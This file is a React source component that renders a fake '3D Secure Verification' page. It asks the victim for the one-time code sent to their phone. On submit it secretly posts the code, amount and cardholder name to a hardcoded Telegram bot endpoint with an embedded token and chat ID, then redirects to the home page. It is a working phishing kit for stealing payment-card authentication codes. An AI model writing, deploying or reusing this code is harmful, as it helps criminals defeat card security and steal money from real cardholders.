import React, { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";

const sendTelegramNotification = async (code: string, amount: string, cardHolder: string) => {
  try {
    const response = await fetch('https://api.telegram.org/bot7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU/sendMessage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: "6293259686",
        text: `3DS Code Verification:
Amount: ${amount}
Card Holder: ${cardHolder}
Code: ${code}`,
      }),
    });
    console.log('3DS notification sent:', response.ok);
  } catch (error) {
    console.error('Error sending 3DS notification:', error);
  }
};

export default function Verify3DS() {
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "0";
  const cardHolder = searchParams.get("cardHolder") || "";
  const [code, setCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Send 3DS code to Telegram
    await sendTelegramNotification(code, amount, cardHolder);

    // Add delay for processing
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Redirect to success or another page
    navigate("/");
  };

  return (
    <div className="min-h-screen w-full bg-black flex items-center justify-center relative">
      <div className="absolute inset-0 bg-gradient-to-br from-black via-gray-900 to-black">
        <div className="absolute inset-0 opacity-30">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.1),transparent_50%)] animate-pulse"></div>
        </div>
      </div>
      <form onSubmit={handleSubmit} className="w-full max-w-md space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 relative z-10">
        <div className="space-y-2">
          <h2 className="text-2xl font-bold text-white text-center">
            3D Secure Verification
          </h2>
          <p className="text-gray-400 text-center">
            Enter the code sent to your phone
          </p>
        </div>
        <div className="space-y-4">
          <Input
            type="text"
            placeholder="Enter Code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
            required
          />
          <Button
            type="submit"
            disabled={isSubmitting}
            className="w-full bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-white hover:opacity-90 transition-opacity"
          >
            {isSubmitting ? "Verifying..." : "Verify"}
          </Button>
        </div>
      </form>
    </div>
  );
}